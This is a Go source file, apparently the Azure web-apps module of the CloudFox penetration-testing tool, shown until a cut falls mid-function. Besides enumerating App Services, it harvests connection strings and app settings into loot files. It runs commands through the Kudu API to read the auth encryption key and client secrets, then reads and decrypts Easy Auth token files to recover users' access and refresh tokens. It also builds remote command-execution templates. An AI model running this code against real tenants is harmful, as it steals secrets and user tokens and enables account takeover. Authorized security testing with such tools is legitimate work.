package azure

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"regexp"
	"strings"
	"time"

	web "github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/appservice/armappservice"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
)

// GetWebAppsPerSubscriptionID enumerates all Web & App Services per subscription
//func GetWebAppsPerSubscriptionID(ctx context.Context, subscriptionID string, lootMap map[string]*internal.LootFile) [][]string {
//	var resultsBody [][]string
//	logger := internal.NewLogger()
//
//	for _, s := range GetSubscriptions() { // returns []*armsubscriptions.Subscription
//		if s.SubscriptionID != nil && *s.SubscriptionID == subscriptionID {
//			if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
//				logger.InfoM(fmt.Sprintf("Enumerating resource groups for subscription %s", subscriptionID), globals.AZ_WEBAPPS_MODULE_NAME)
//			}
//
//			resourceGroups := GetResourceGroupsPerSubscription(subscriptionID)
//			for _, rg := range resourceGroups {
//				if rg == nil || rg.Name == nil {
//					continue
//				}
//				//				if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
//				//					logger.InfoM(fmt.Sprintf("Fetching web apps in resource group %s for subscription %s", *rg.Name, subscriptionID), globals.AZ_WEBAPPS_MODULE_NAME)
//				//				}
//
//				webApps, err := GetWebAppsPerResourceGroup(subscriptionID, *rg.Name)
//				if err != nil {
//					if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
//						logger.ErrorM(fmt.Sprintf("Could not enumerate Web Apps for resource group %s in subscription %s: %v\n", *rg.Name, subscriptionID, err), globals.AZ_WEBAPPS_MODULE_NAME)
//					}
//					continue
//				}
//
//				for _, app := range webApps {
//
//					if app == nil || app.Name == nil {
//						continue
//					}
//					if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
//						logger.InfoM(fmt.Sprintf("Processing WebApp: %s in resource group %s", *app.Name, *rg.Name), globals.AZ_WEBAPPS_MODULE_NAME)
//					}
//
//					privateIPs, publicIPs, vnetName, subnetName := GetWebAppNetworkInfo(subscriptionID, *rg.Name, app)
//
//					systemRolesList := []string{}
//					userRolesList := []string{}
//					if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
//						logger.InfoM(fmt.Sprintf("Fetching system/user-assigned roles for WebApp: %s", *app.Name), globals.AZ_WEBAPPS_MODULE_NAME)
//					}
//					if app.Identity != nil {
//						ctx := context.Background()
//						// System Assigned Roles
//						if app.Identity.PrincipalID != nil {
//							roles, err := GetRoleAssignmentsForPrincipal(ctx, *app.Identity.PrincipalID, subscriptionID)
//							if err == nil && len(roles) > 0 {
//								systemRolesList = roles
//							}
//						}
//						// User Assigned Roles
//						if app.Identity.UserAssignedIdentities != nil {
//							for _, v := range app.Identity.UserAssignedIdentities {
//								if v != nil && v.PrincipalID != nil {
//									roles, err := GetRoleAssignmentsForPrincipal(ctx, *v.PrincipalID, subscriptionID)
//									if err == nil && len(roles) > 0 {
//										userRolesList = append(userRolesList, roles...)
//									}
//								}
//							}
//						}
//					}
//
//					dnsName := "N/A"
//					url := "N/A"
//					if app.Properties != nil && app.Properties.DefaultHostName != nil {
//						dnsName = *app.Properties.DefaultHostName
//						url = fmt.Sprintf("https://%s", *app.Properties.DefaultHostName)
//					}
//
//					// Flatten rows so each private/public IP is its own row
//					if len(privateIPs) == 0 {
//						privateIPs = []string{"N/A"}
//					}
//					if len(publicIPs) == 0 {
//						publicIPs = []string{"N/A"}
//					}
//					if len(systemRolesList) == 0 {
//						systemRolesList = []string{"N/A"}
//					}
//					if len(userRolesList) == 0 {
//						userRolesList = []string{"N/A"}
//					}
//					credentials := "N/A"
//
//					// Only check if identity exists
//					if app.Identity != nil && app.Identity.PrincipalID != nil {
//						credInfo, err := GetServicePrincipalCredentials(*app.Identity.PrincipalID)
//						if err == nil {
//							var credLines []string
//							for _, c := range credInfo {
//								credType := c.Type // "Password" or "Key"
//								credLines = append(credLines, credType)
//								lootMap["webapps-credentials"].Contents += fmt.Sprintf(
//									"Subscription: %s\nResourceGroup: %s\nWebApp: %s\nCredential Type: %s\nKeyID: %s\nStart: %s\nEnd: %s\n\n",
//									subscriptionID, *rg.Name, *app.Name, credType, c.KeyID, c.StartDate, c.EndDate,
//								)
//							}
//							if len(credLines) > 0 {
//								credentials = strings.Join(credLines, ", ")
//							}
//						}
//						// 🔹 Add az cli + PowerShell credential commands loot
//						lootMap["webapps-commands"].Contents += fmt.Sprintf(
//							"Subscription: %s\nResourceGroup: %s\nWebApp: %s\n"+
//								"# Az CLI:\n"+
//								"# Set the Azure subscription context\n"+
//								"az account set --subscription %s\n"+
//								"# Resolve AppId from the Service Principal and list credentials\n"+
//								"APPID=$(az ad sp show --id %s --query appId -o tsv)\n"+
//								"az ad app credential list --id $APPID\n\n"+
//								"# PowerShell:\n"+
//								"Set-AzContext -Subscription %s\n"+
//								"$sp = Get-AzADServicePrincipal -ObjectId %s\n"+
//								"Get-AzADAppCredential -ObjectId $sp.AppId\n\n",
//							subscriptionID, *rg.Name, *app.Name,
//							subscriptionID,
//							*app.Identity.PrincipalID,
//							subscriptionID,
//							*app.Identity.PrincipalID,
//						)
//
//					}
//
//					// Produce one row per combination of private/public IP
//					for _, privIP := range privateIPs {
//						for _, pubIP := range publicIPs {
//							for _, sysRole := range systemRolesList {
//								for _, userRole := range userRolesList {
//									resultsBody = append(resultsBody, []string{
//										subscriptionID,
//										GetSubscriptionNameFromID(ctx, subscriptionID),
//										*rg.Name,
//										*app.Location,
//										*app.Name,
//										privIP,
//										pubIP,
//										vnetName,
//										subnetName,
//										dnsName,
//										url,
//										sysRole,
//										userRole,
//										credentials,
//									})
//								}
//							}
//						}
//					}
//
//					// ---------------- Loot commands per Web App ----------------
//					if app.Properties.SiteConfig != nil {
//						if len(app.Properties.SiteConfig.ConnectionStrings) > 0 {
//							for _, cs := range app.Properties.SiteConfig.ConnectionStrings {
//								lootMap["webapps-connectionstrings"].Contents += fmt.Sprintf(
//									"Subscription: %s\nResourceGroup: %s\nWebApp: %s\nConnection String Name: %s\nValue: %s\n\n",
//									subscriptionID, *rg.Name, *app.Name, cs.Name, cs.ConnectionString,
//								)
//							}
//						}
//
//						if len(app.Properties.SiteConfig.AppSettings) > 0 {
//							for _, setting := range app.Properties.SiteConfig.AppSettings {
//								lootMap["webapps-configuration"].Contents += fmt.Sprintf(
//									"Subscription: %s\nResourceGroup: %s\nWebApp: %s\nApp Setting: %s = %s\n\n",
//									subscriptionID, *rg.Name, *app.Name, setting.Name, setting.Value,
//								)
//							}
//						}
//					}
//				}
//			}
//		}
//	}
//
//	return resultsBody
//}

// GetWebAppsPerRG enumerates all Web & App Services per resource group
// GetWebAppsPerRGWithAuth processes web apps with EntraID auth status
func GetWebAppsPerRGWithAuth(ctx context.Context, subscriptionID string, lootMap map[string]*internal.LootFile, rgName string, authEnabledApps map[string]bool, tenantName, tenantID string) [][]string {
	return getWebAppsPerRGInternal(ctx, subscriptionID, lootMap, rgName, authEnabledApps, tenantName, tenantID)
}

// GetWebAppsPerRG processes web apps (legacy, calls internal function with nil auth map)
func GetWebAppsPerRG(ctx context.Context, subscriptionID string, lootMap map[string]*internal.LootFile, rgName string) [][]string {
	return getWebAppsPerRGInternal(ctx, subscriptionID, lootMap, rgName, nil, "", "")
}

// getWebAppsPerRGInternal is the internal implementation
func getWebAppsPerRGInternal(ctx context.Context, subscriptionID string, lootMap map[string]*internal.LootFile, rgName string, authEnabledApps map[string]bool, tenantName, tenantID string) [][]string {
	var resultsBody [][]string
	var appServiceCommandInfoList []AppServiceCommandInfo
	logger := internal.NewLogger()

	// Initialize session
	session, _ := NewSafeSession(ctx)
	if session == nil {
		logger.ErrorM("Failed to initialize SafeSession", globals.AZ_PRINCIPALS_MODULE_NAME)
		return nil
	}

	if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Fetching web apps in resource group %s for subscription %s", rgName, subscriptionID), globals.AZ_WEBAPPS_MODULE_NAME)
	}

	webApps, err := GetWebAppsPerResourceGroup(session, subscriptionID, rgName)
	if err != nil {
		if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
			logger.ErrorM(fmt.Sprintf("Could not enumerate Web Apps for resource group %s in subscription %s: %v\n", rgName, subscriptionID, err), globals.AZ_WEBAPPS_MODULE_NAME)
		}
		return resultsBody
	}

	for _, app := range webApps {
		if app == nil || app.Name == nil || app.Location == nil {
			continue // skip incomplete web apps
		}
		appName := *app.Name
		location := *app.Location

		if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
			logger.InfoM(fmt.Sprintf("Processing WebApp: %s in resource group %s", appName, rgName), globals.AZ_WEBAPPS_MODULE_NAME)
		}

		privateIPs, publicIPs, vnetName, subnetName := GetWebAppNetworkInfo(session, subscriptionID, rgName, app)

		// --- Identity IDs ---
		systemAssignedID := "N/A"
		userAssignedID := "N/A"

		if app.Identity != nil {
			// System Assigned Identity ID
			if app.Identity.PrincipalID != nil {
				systemAssignedID = *app.Identity.PrincipalID
			}

			// User Assigned Identity IDs
			if app.Identity.UserAssignedIdentities != nil && len(app.Identity.UserAssignedIdentities) > 0 {
				var userAssignedIDs []string
				for _, v := range app.Identity.UserAssignedIdentities {
					if v != nil && v.PrincipalID != nil {
						userAssignedIDs = append(userAssignedIDs, *v.PrincipalID)
					}
				}
				if len(userAssignedIDs) > 0 {
					userAssignedID = strings.Join(userAssignedIDs, "\n")
				}
			}
		}

		// --- DNS & URL ---
		dnsName := "N/A"
		url := "N/A"
		if app.Properties != nil && app.Properties.DefaultHostName != nil {
			dnsName = *app.Properties.DefaultHostName
			url = fmt.Sprintf("https://%s", dnsName)
		}

		// --- Security Settings ---
		httpsOnly := "No"
		minTlsVersion := "N/A"

		// EntraID Centralized Auth (Easy Auth / App Service Authentication)
		authEnabled := "Disabled"
		if authEnabledApps != nil {
			if authEnabledApps[appName] {
				authEnabled = "Enabled"
			}
		} else {
			// If auth map not provided (legacy call), set to N/A
			authEnabled = "N/A"
		}

		if app.Properties != nil {
			// HTTPS Only
			if app.Properties.HTTPSOnly != nil && *app.Properties.HTTPSOnly {
				httpsOnly = "Yes"
			}

			// Minimum TLS Version
			if app.Properties.SiteConfig != nil && app.Properties.SiteConfig.MinTLSVersion != nil {
				minTlsVersion = string(*app.Properties.SiteConfig.MinTLSVersion)
			}
		}

		// --- App Service Plan (SKU) ---
		appServicePlan := "N/A"
		if app.Properties != nil && app.Properties.ServerFarmID != nil {
			// Extract plan name from resource ID: /subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/serverfarms/{planName}
			serverFarmID := *app.Properties.ServerFarmID
			parts := strings.Split(serverFarmID, "/")
			if len(parts) > 0 {
				appServicePlan = parts[len(parts)-1] // Last part is the plan name
			}
		}

		// --- Tags ---
		tags := "N/A"
		if app.Tags != nil && len(app.Tags) > 0 {
			var tagPairs []string
			for k, v := range app.Tags {
				if v != nil {
					tagPairs = append(tagPairs, fmt.Sprintf("%s:%s", k, *v))
				} else {
					tagPairs = append(tagPairs, k)
				}
			}
			if len(tagPairs) > 0 {
				tags = strings.Join(tagPairs, ", ")
			}
		}

		// --- Runtime Version ---
		runtime := "N/A"
		if app.Properties != nil && app.Properties.SiteConfig != nil {
			// Linux runtime stack (e.g., "NODE|14-lts", "PYTHON|3.9", "DOTNETCORE|6.0")
			if app.Properties.SiteConfig.LinuxFxVersion != nil && *app.Properties.SiteConfig.LinuxFxVersion != "" {
				runtime = *app.Properties.SiteConfig.LinuxFxVersion
			} else if app.Properties.SiteConfig.WindowsFxVersion != nil && *app.Properties.SiteConfig.WindowsFxVersion != "" {
				// Windows runtime stack (less common, but exists)
				runtime = *app.Properties.SiteConfig.WindowsFxVersion
			} else if app.Properties.SiteConfig.JavaVersion != nil && *app.Properties.SiteConfig.JavaVersion != "" {
				// Java version (can be set independently)
				runtime = fmt.Sprintf("Java|%s", *app.Properties.SiteConfig.JavaVersion)
			} else if app.Properties.SiteConfig.PhpVersion != nil && *app.Properties.SiteConfig.PhpVersion != "" {
				// PHP version
				runtime = fmt.Sprintf("PHP|%s", *app.Properties.SiteConfig.PhpVersion)
			} else if app.Properties.SiteConfig.NodeVersion != nil && *app.Properties.SiteConfig.NodeVersion != "" {
				// Node version
				runtime = fmt.Sprintf("Node|%s", *app.Properties.SiteConfig.NodeVersion)
			} else if app.Properties.SiteConfig.PythonVersion != nil && *app.Properties.SiteConfig.PythonVersion != "" {
				// Python version
				runtime = fmt.Sprintf("Python|%s", *app.Properties.SiteConfig.PythonVersion)
			}
		}

		// --- Credentials ---
		// Simple indicator: credentials for webapp managed identities are enumerated in accesskeys.go
		credentials := "No"
		if app.Identity != nil && app.Identity.PrincipalID != nil {
			credentials = "Yes"
		}

		// --- Flatten rows ---
		if len(privateIPs) == 0 {
			privateIPs = []string{"N/A"}
		}
		if len(publicIPs) == 0 {
			publicIPs = []string{"N/A"}
		}

		for _, privIP := range privateIPs {
			for _, pubIP := range publicIPs {
				resultsBody = append(resultsBody, []string{
					tenantName, // NEW: for multi-tenant support
					tenantID,   // NEW: for multi-tenant support
					subscriptionID,
					GetSubscriptionNameFromID(ctx, session, subscriptionID),
					rgName,
					location,
					appName,
					appServicePlan,
					runtime,
					tags,
					privIP,
					pubIP,
					vnetName,
					subnetName,
					dnsName,
					url,
					credentials,
					httpsOnly,
					minTlsVersion,
					authEnabled,
					systemAssignedID,
					userAssignedID,
				})
			}
		}

		// --- Loot for SiteConfig ---
		if app.Properties != nil && app.Properties.SiteConfig != nil {
			if app.Properties.SiteConfig.ConnectionStrings != nil {
				for _, cs := range app.Properties.SiteConfig.ConnectionStrings {
					if lootMap["webapps-connectionstrings"] != nil {
						lootMap["webapps-connectionstrings"].Contents += fmt.Sprintf(
							"Subscription: %s\nResourceGroup: %s\nWebApp: %s\nConnection String Name: %s\nValue: %s\n\n",
							subscriptionID, rgName, appName, SafeStringPtr(cs.Name), SafeStringPtr(cs.ConnectionString),
						)
					}
				}
			}

			if app.Properties.SiteConfig.AppSettings != nil {
				for _, setting := range app.Properties.SiteConfig.AppSettings {
					if lootMap["webapps-configuration"] != nil {
						lootMap["webapps-configuration"].Contents += fmt.Sprintf(
							"Subscription: %s\nResourceGroup: %s\nWebApp: %s\nApp Setting: %s = %s\n\n",
							subscriptionID, rgName, appName, SafeStringPtr(setting.Name), SafeStringPtr(setting.Value),
						)
					}
				}
			}
		}

		// ==================== COLLECT APP SERVICE COMMAND INFO ====================
		// Collect information for command execution template generation
		scmHostname := ""
		if app.Properties != nil && app.Properties.HostNameSSLStates != nil {
			for _, sslState := range app.Properties.HostNameSSLStates {
				if sslState.Name != nil && strings.Contains(*sslState.Name, ".scm.") {
					scmHostname = *sslState.Name
					break
				}
			}
		}

		// Determine OS type and container status
		isLinux := false
		isContainer := false
		kind := "app"
		if app.Kind != nil {
			kind = *app.Kind
			if strings.Contains(strings.ToLower(kind), "linux") {
				isLinux = true
			}
			if strings.Contains(strings.ToLower(kind), "container") {
				isContainer = true
			}
		}

		// Get app state
		state := "Unknown"
		if app.Properties != nil && app.Properties.State != nil {
			state = *app.Properties.State
		}

		// Determine identity info
		hasIdentity := false
		identityType := "None"
		if app.Identity != nil && app.Identity.Type != nil {
			hasIdentity = true
			identityType = string(*app.Identity.Type)
		}

		// Only collect info for running apps with SCM hostname
		if scmHostname != "" {
			appInfo := AppServiceCommandInfo{
				AppName:        appName,
				ResourceGroup:  rgName,
				SubscriptionID: subscriptionID,
				Location:       location,
				Kind:           kind,
				State:          state,
				SCMHostname:    scmHostname,
				HasIdentity:    hasIdentity,
				IdentityType:   identityType,
				IsLinux:        isLinux,
				IsContainer:    isContainer,
			}
			appServiceCommandInfoList = append(appServiceCommandInfoList, appInfo)

			// Generate individual app command template
			if lootMap != nil {
				if lf, ok := lootMap["webapps-commands"]; ok {
					template := GenerateAppServiceCommandTemplate(appInfo)
					lf.Contents += template + "\n"
				}
			}
		}
	}

	// ==================== GENERATE BULK COMMAND TEMPLATE ====================
	// Generate bulk command template if we found multiple apps
	if lootMap != nil && len(appServiceCommandInfoList) > 0 {
		if lf, ok := lootMap["webapps-bulk-commands"]; ok {
			bulkTemplate := GenerateBulkAppServiceCommandTemplate(appServiceCommandInfoList, subscriptionID)
			lf.Contents += bulkTemplate
		}
	}

	return resultsBody
}

func GetWebAppsPerResourceGroup(session *SafeSession, subscriptionID, resourceGroup string) ([]*web.Site, error) {
	client := GetWebAppsClient(session, subscriptionID)
	var apps []*web.Site

	pager := client.NewListByResourceGroupPager(resourceGroup, nil)
	for pager.More() {
		page, err := pager.NextPage(context.Background())
		if err != nil {
			return nil, fmt.Errorf("could not enumerate web apps in RG %s: %v", resourceGroup, err)
		}
		apps = append(apps, page.Value...)
	}
	return apps, nil
}

// GetWebAppNetworkInfo returns private IPs, public IPs, VNet name, and Subnet name
func GetWebAppNetworkInfo(session *SafeSession, subscriptionID, resourceGroup string, app *web.Site) (privateIPs, publicIPs []string, vnetName, subnetName string) {
	logger := internal.NewLogger()
	privateIPs = []string{"N/A"}
	publicIPs = []string{"N/A"}
	vnetName = "N/A"
	subnetName = "N/A"
	if app.Properties == nil {
		return
	}
	if globals.AZ_VERBOSITY >= globals.AZ_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Fetching network info for WebApp: %s", *app.Name), globals.AZ_WEBAPPS_MODULE_NAME)
	}

	// ------------------- Handle VNet Integration / ASE -------------------
	if app.Properties.VirtualNetworkSubnetID != nil {
		subnetID := *app.Properties.VirtualNetworkSubnetID
		parts := strings.Split(subnetID, "/")

		for i := 0; i < len(parts); i++ {
			if strings.EqualFold(parts[i], "virtualNetworks") && i+1 < len(parts) {
				vnetName = parts[i+1]
			}
			if strings.EqualFold(parts[i], "subnets") && i+1 < len(parts) {
				subnetName = parts[i+1]
			}
		}

		// Query the subnet to pull private IP info
		vnetRG := resourceGroup
		for i := 0; i < len(parts); i++ {
			if strings.EqualFold(parts[i], "resourceGroups") && i+1 < len(parts) {
				vnetRG = parts[i+1]
			}
		}
		subnetClient, _ := GetSubnetsClient(session, subscriptionID)
		subnet, err := subnetClient.Get(context.Background(), vnetRG, vnetName, subnetName, nil)
		if err == nil && subnet.Properties != nil && subnet.Properties.IPConfigurations != nil {
			privateIPs = []string{}
			for _, ipconf := range subnet.Properties.IPConfigurations {
				if ipconf.Properties != nil && ipconf.Properties.PrivateIPAddress != nil {
					privateIPs = append(privateIPs, *ipconf.Properties.PrivateIPAddress)
				}
			}
			if len(privateIPs) == 0 {
				privateIPs = []string{"No explicit private IPs allocated"}
			}
		}
	}

	// ------------------- Handle Public Outbound IPs -------------------
	if app.Properties != nil {
		if app.Properties.OutboundIPAddresses != nil && *app.Properties.OutboundIPAddresses != "" {
			publicIPs = strings.Split(*app.Properties.OutboundIPAddresses, ",")
		} else if app.Properties.PossibleOutboundIPAddresses != nil && *app.Properties.PossibleOutboundIPAddresses != "" {
			publicIPs = strings.Split(*app.Properties.PossibleOutboundIPAddresses, ",")
		}
	}

	return
}

// ==================== EASY AUTH TOKEN EXTRACTION (Get-AzWebAppTokens.ps1) ====================

type WebAppAuthConfig struct {
	AppName       string
	ResourceGroup string
	ClientID      string
	ClientSecret  string
	TenantID      string
	EncryptionKey string
	IsLinux       bool
	KuduURL       string
}

type DecryptedToken struct {
	AppName      string
	UserID       string
	AccessToken  string
	RefreshToken string
	ExpiresOn    string
	RawJSON      string
}

// GetWebAppAuthConfigs checks which web apps have Easy Auth enabled
func GetWebAppAuthConfigs(session *SafeSession, subID string, webApps []*web.Site) []WebAppAuthConfig {
	token, err := session.GetTokenForResource(globals.CommonScopes[0])
	if err != nil {
		return nil
	}

	var configs []WebAppAuthConfig

	for _, app := range webApps {
		if app == nil || app.ID == nil || app.Name == nil {
			continue
		}

		// Check Easy Auth
		authURL := fmt.Sprintf("https://management.azure.com%s/Config/authsettings/list?api-version=2016-03-01", *app.ID)

		retryConfig := DefaultRateLimitConfig()
		retryConfig.MaxRetries = 5
		retryConfig.InitialDelay = 2 * time.Second
		retryConfig.MaxDelay = 2 * time.Minute

		body, err := HTTPRequestWithRetry(context.Background(), "POST", authURL, token, nil, retryConfig)
		if err != nil {
			continue
		}

		var authSettings struct {
			Properties struct {
				ClientID string `json:"clientId"`
			} `json:"properties"`
		}
		json.Unmarshal(body, &authSettings)

		if authSettings.Properties.ClientID == "" {
			continue
		}

		// Find Kudu URL
		kuduURL := ""
		if app.Properties != nil && app.Properties.EnabledHostNames != nil {
			for _, hostname := range app.Properties.EnabledHostNames {
				if hostname != nil && strings.Contains(*hostname, ".scm.") {
					kuduURL = "https://" + *hostname
					break
				}
			}
		}
		if kuduURL == "" {
			continue
		}

		isLinux := false
		if app.Kind != nil {
			isLinux = strings.Contains(strings.ToLower(*app.Kind), "linux")
		}

		// Get env vars
		envCmd := "env"
		if !isLinux {
			envCmd = "cmd /c set"
		}
		envVars := executeKuduCommand(kuduURL, token, envCmd)
		if envVars == "" {
			continue
		}

		config := WebAppAuthConfig{
			AppName:  *app.Name,
			IsLinux:  isLinux,
			KuduURL:  kuduURL,
			ClientID: authSettings.Properties.ClientID,
		}

		// Parse env vars
		for _, line := range strings.Split(envVars, "\n") {
			if strings.Contains(line, "WEBSITE_AUTH_ENCRYPTION_KEY") {
				parts := strings.SplitN(line, "=", 2)
				if len(parts) == 2 {
					config.EncryptionKey = strings.TrimSpace(parts[1])
				}
			} else if strings.Contains(line, "MICROSOFT_PROVIDER_AUTHENTICATION_SECRET") || strings.Contains(line, "AUTH_CLIENT_SECRET") {
				parts := strings.SplitN(line, "=", 2)
				if len(parts) == 2 {
					config.ClientSecret = strings.TrimSpace(parts[1])
				}
			} else if strings.Contains(line, "WEBSITE_AUTH_OPENID_ISSUER") {
				parts := strings.SplitN(line, "=", 2)
				if len(parts) == 2 {
					re := regexp.MustCompile(`([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})`)
					if matches := re.FindStringSubmatch(parts[1]); len(matches) > 1 {
						config.TenantID = matches[1]
					}
				}
			}
		}

		// Extract RG from ID
		if strings.Contains(*app.ID, "/resourceGroups/") {
			parts := strings.Split(*app.ID, "/resourceGroups/")
			if len(parts) >= 2 {
				rgPart := strings.Split(parts[1], "/")
				if len(rgPart) > 0 {
					config.ResourceGroup = rgPart[0]
				}
			}
		}

		if config.EncryptionKey != "" {
			configs = append(configs, config)
		}
	}

	return configs
}

// ExtractAndDecryptTokens reads and decrypts tokens from .auth/tokens
func ExtractAndDecryptTokens(config WebAppAuthConfig, token string) []DecryptedToken {
	var results []DecryptedToken

	tokenPath := "/home/data/.auth/tokens"
	if !config.IsLinux {
		tokenPath = `C:\home\data\.auth\tokens`
	}

	// List files
	listCmd := fmt.Sprintf("ls -la %s", tokenPath)
	if !config.IsLinux {
		listCmd = fmt.Sprintf(`powershell -c "Get-ChildItem -Path \"%s\" -Name"`, tokenPath)
	}

	listOutput := executeKuduCommand(config.KuduURL, token, listCmd)
	if listOutput == "" {
		return results
	}

	// Extract filenames
	var jsonFiles []string
	for _, line := range strings.Split(listOutput, "\n") {
		line = strings.TrimSpace(line)
		if config.IsLinux {
			re := regexp.MustCompile(`\s+([a-f0-9]+\.json)`)
			if matches := re.FindStringSubmatch(line); len(matches) > 1 {
				jsonFiles = append(jsonFiles, matches[1])
			}
		} else if strings.HasSuffix(line, ".json") {
			jsonFiles = append(jsonFiles, line)
		}
	}

	// Decrypt each file
	for _, fileName := range jsonFiles {
		readCmd := fmt.Sprintf("cat %s/%s", tokenPath, fileName)
		if !config.IsLinux {
			readCmd = fmt.Sprintf(`powershell -c "Get-Content -Path \"%s\%s\" -Raw"`, tokenPath, fileName)
		}

		content := executeKuduCommand(config.KuduURL, token, readCmd)
		if content == "" {
			continue
		}

		var tokenFile struct {
			Encrypted bool              `json:"encrypted"`
			Tokens    map[string]string `json:"tokens"`
		}

		cleanContent := strings.ReplaceAll(content, `\/`, `/`)
		if json.Unmarshal([]byte(cleanContent), &tokenFile) != nil || !tokenFile.Encrypted {
			continue
		}

		for _, encryptedToken := range tokenFile.Tokens {
			decrypted := decryptToken(encryptedToken, config.EncryptionKey)
			if decrypted == "" {
				continue
			}

			var tokenData map[string]interface{}
			if json.Unmarshal([]byte(decrypted), &tokenData) != nil {
				continue
			}

			userID, _ := tokenData["user_id"].(string)
			accessToken, _ := tokenData["access_token"].(string)
			refreshToken, _ := tokenData["refresh_token"].(string)
			expiresOn, _ := tokenData["expires_on"].(string)

			results = append(results, DecryptedToken{
				AppName:      config.AppName,
				UserID:       userID,
				AccessToken:  accessToken,
				RefreshToken: refreshToken,
				ExpiresOn:    expiresOn,
				RawJSON:      decrypted,
			})
		}
	}

	return results
}

func executeKuduCommand(kuduURL, token, command string) string {
	reqBody, _ := json.Marshal(map[string]string{"command": command})

	config := DefaultRateLimitConfig()
	config.MaxRetries = 5
	config.InitialDelay = 2 * time.Second
	config.MaxDelay = 2 * time.Minute

	body, err := HTTPRequestWithRetry(context.Background(), "POST", kuduURL+"/api/command", token, bytes.NewBuffer(reqBody), config)
	if err != nil {
		return ""
	}

	var result struct {
		Output string `json:"Output"`
	}
	json.Unmarshal(body, &result)
	return result.Output
}

func decryptToken(encryptedToken, encryptionKey string) string {
	fixed := fixBase64Padding(encryptedToken)
	encryptedBytes, err := base64.StdEncoding.DecodeString(fixed)
	if err != nil || len(encryptedBytes) < 16 {
		return ""
	}

	iv := encryptedBytes[0:16]
	cipherText := encryptedBytes[16:]

	keyBytes, err := hex.DecodeString(encryptionKey)
	if err != nil || len(keyBytes) != 32 {
		return ""
	}

	block, _ := aes.NewCipher(keyBytes)
	mode := cipher.NewCBCDecrypter(block, iv)

	plaintext := make([]byte, len(cipherText))
	mode.CryptBlocks(plaintext, cipherText)

	plaintext = removePKCS7Padding(plaintext)
	if plaintext == nil {
		return ""
	}

	return string(plaintext)
}

func fixBase64Padding(s string) string {
	clean := strings.TrimSpace(strings.TrimRight(s, "="))
	clean = strings.ReplaceAll(strings.ReplaceAll(clean, "-", "+"), "_", "/")
	re := regexp.MustCompile(`[^A-Za-z0-9+/]`)
	clean = re.ReplaceAllString(clean, "")
	return clean + strings.Repeat("=", (4-(len(clean)%4))%4)
}

func removePKCS7Padding(data []byte) []byte {
	if len(data) == 0 {
		return nil
	}
	paddingLen := int(data[len(data)-1])
	if paddingLen > len(data) || paddingLen == 0 {
		return nil
	}
	for i := len(data) - paddingLen; i < len(data); i++ {
		if data[i] != byte(paddingLen) {
			return nil
		}
	}
	return data[:len(data)-paddingLen]
}

// ==================== APP SERVICES COMMAND EXECUTION TEMPLATE GENERATION ====================

// AppServiceCommandInfo contains information needed to generate command execution templates
type AppServiceCommandInfo struct {
	AppName        string
	ResourceGroup  string
	SubscriptionID string
	Location       string
	Kind           string // "app", "functionapp", "linux", etc.
	State          string
	SCMHostname    string // The .scm.azurewebsites.net hostname
	HasIdentity    bool
	IdentityType   string
	IsLinux        bool
	IsContainer    bool
}

// GenerateAppServiceCommandTemplate creates comprehensive command execution templates for App Services
func GenerateAppServiceCommandTemplate(app AppServiceCommandInfo) string {
	var template string

	template += fmt.Sprintf("# ============================================================================\n")
	template += fmt.Sprintf("# App Services Command Execution Template\n")
	template += fmt.Sprintf("# App Name: %s\n", app.AppName)
	template += fmt.Sprintf("# Resource Group: %s\n", app.ResourceGroup)
	template += fmt.Sprintf("# Subscription: %s\n", app.SubscriptionID)
	template += fmt.Sprintf("# Kind: %s\n", app.Kind)
	template += fmt.Sprintf("# State: %s\n", app.State)
	template += fmt.Sprintf("# SCM Hostname: %s\n", app.SCMHostname)
	if app.HasIdentity {
		template += fmt.Sprintf("# Managed Identity: %s\n", app.IdentityType)
	}
	template += fmt.Sprintf("# ============================================================================\n\n")

	if app.State != "Running" {
		template += fmt.Sprintf("# WARNING: This app is not currently running (State: %s)\n", app.State)
		template += fmt.Sprintf("# The app must be in 'Running' state to execute commands\n\n")
		return template
	}

	// Determine shell type based on OS
	exampleCommand := "ls /home"
	if !app.IsLinux {
		exampleCommand = "dir D:\\home"
	}

	template += fmt.Sprintf("## Method 1: Kudu API - Using Publishing Credentials\n\n")
	template += fmt.Sprintf("This method uses the publishing profile credentials to authenticate to the Kudu API.\n\n")
	template += fmt.Sprintf("```powershell\n")
	template += fmt.Sprintf("# Get publishing credentials\n")
	template += fmt.Sprintf("$app = Get-AzWebApp -Name \"%s\" -ResourceGroupName \"%s\"\n", app.AppName, app.ResourceGroup)
	template += fmt.Sprintf("[xml]$publishProfile = Get-AzWebAppPublishingProfile -Name $app.Name -ResourceGroupName $app.ResourceGroup\n\n")
	template += fmt.Sprintf("# Extract credentials\n")
	template += fmt.Sprintf("$username = $publishProfile.publishData.publishProfile[0].userName\n")
	template += fmt.Sprintf("$password = $publishProfile.publishData.publishProfile[0].userPWD\n\n")
	template += fmt.Sprintf("# Create basic auth header\n")
	template += fmt.Sprintf("$basicAuth = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(\"$username:$password\"))\n")
	template += fmt.Sprintf("$authHeader = @{Authorization=\"Basic $basicAuth\"}\n\n")
	template += fmt.Sprintf("# Prepare command\n")
	template += fmt.Sprintf("$commandBody = @{\n")
	template += fmt.Sprintf("    command = \"%s\"\n", exampleCommand)
	template += fmt.Sprintf("    dir = \"D:\\home\\site\\wwwroot\"  # Optional: specify working directory\n")
	template += fmt.Sprintf("} | ConvertTo-Json\n\n")
	template += fmt.Sprintf("# Execute command via Kudu API\n")
